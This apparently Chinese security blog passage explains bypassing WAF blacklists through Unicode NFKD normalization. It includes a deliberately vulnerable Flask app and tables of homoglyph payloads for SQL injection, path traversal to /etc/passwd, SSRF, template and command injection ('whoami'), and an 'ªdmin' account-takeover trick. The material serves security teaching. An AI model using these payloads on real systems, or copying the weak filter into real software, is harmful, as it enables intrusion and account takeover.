    from flask import Flask, abort, request
    import unicodedata
    from waf import waf
    app = Flask(__name__)
    @app.route('/')
    def Welcome_name():
      name = request.args.get('name')
      if waf(name):
        abort(403, description="XSS!!!")
      else:
        name = unicodedata.normalize('NFKD', name) #NFC, NFKC, NFD, and NFKD
        return 'Results: ' + name
    if __name__ == '__main__':
      app.run(port=5000)
然后编写一个简单的waf：
    def waf(input):
        print(input)
        blacklist = ["~","!","@","#","$","%","^","&","*","(",")","_","_","+","=","{","}","]","[","|","\",",".","/","?",";",":",""",""",""]
        vuln_detected = False
        if any(string in input for string in blacklist): 
            vuln_detected = True
        return vuln_detected
当我们用普通的payload去测试，会被waf拦截:
现在这种场景是不是就不那么鸡肋了？
那有人又要问了：阿信啊，说了这么多，这种漏洞要怎么挖呢？
对于没有回显的点，就没办法直接观察到了，但是我们可以用同样的方式进行测试，万一呢？
对了，在测试过程中，最好是对这些特殊字符进行url编码，url编码的形式很多，但是一般是先把这些字符按照utf-8编码过后再进行url编码，我们可以直接用浏览器的控制台进行编码，方便快捷：
在确定了存在Unicode规范化过后，我们就需要构造payload进一步测试了，这个时候怎么找某个字符对应的同形字符呢？这个时候就要祭出我的神器了：
这个工具可以搜索某个字符的同形字符，特别强大，例如`(`,可以找到这么多同形字符：
有了这个，我想，构造一个特殊的payload就不是什么难事儿了吧
或者，你可以到这个表里去找：
## 利用场景
除了上面提到的xss,Unicode还可以用在什么场景上？那可就老多了！
Sql注入
字符 | payload | 规范化后  
---|---|---  
＇(U+FF07) | ＇ or ＇1＇=＇1 | ’ or ‘1’=’1  
＂(U+FF02) | ＂ or ＂1＂=＂1 | ” or “1”=”1  
﹣ (U+FE63) | admin＇﹣﹣ | admin’–  
路径穿越
字符 | payload | 规范化后  
---|---|---  
‥ (U+2025) | ‥/‥/‥/etc/passwd | ../../../etc/passwd  
︰(U+FE30) | ︰/︰/︰/etc/passwd | ../../../etc/passwd  
ssrf
字符 | payload | 规范化后  
---|---|---  
⓪ (U+24EA) | ①②⑦.⓪.⓪.① | 127.0.0.1  
文件上传
字符 | payload | 规范化后  
---|---|---  
ｐ (U+FF50)ʰ (U+02B0) | test.ｐʰｐ | test.php  
开放式跳转
字符 | payload | 规范化后  
---|---|---  
。(U+3002) | jlajara。gitlab。io | jlajara.gitlab.io  
／(U+FF0F) | ／／jlajara.gitlab.io | //jlajara.gitlab.io  
模板注入
字符 | payload | 规范化后  
---|---|---  
﹛(U+FE5B) | ﹛﹛3+3﹜﹜ | {{3+3}}  
［ (U+FF3B) | ［［5+5］］ | [[5+5]]  
命令注入
字符 | payload | 规范化后  
---|---|---  
＆ (U+FF06) | ＆＆whoami | &&whoami  
｜ (U+FF5C) | ｜｜ whoami | \ | \ | whoami  
除此之外，还可以发散一下思维，把该手法运用到二次漏洞中，比如，第一次插入数据的时候没有进行规范化，但是从数据库取数据的时候进行了规范，导致漏洞发生。
同样的，这也会造成一些逻辑漏洞，比如，注册一个名为`ªdmin`的账号，在注册的时候没有规范化，数据库中没有这个账号，成功注册，但是在用户登录的时候进行了规范化，把`ªdmin`规范为admin，这就会导致登录到admin用户的账号上，是不是挺刺激的。
## 其他
翻了几十篇英文文献总结的一篇，还有很多有意思的点没有拓展开，只挑了其中最有用的部分，希望给大家提供一些思路，最后，我能要一个点赞吗？别【下次一定】了
点赞到位，咱们下一期看一个真实案例，嗨到不行，🐻弟们！
再放一个参考PPT：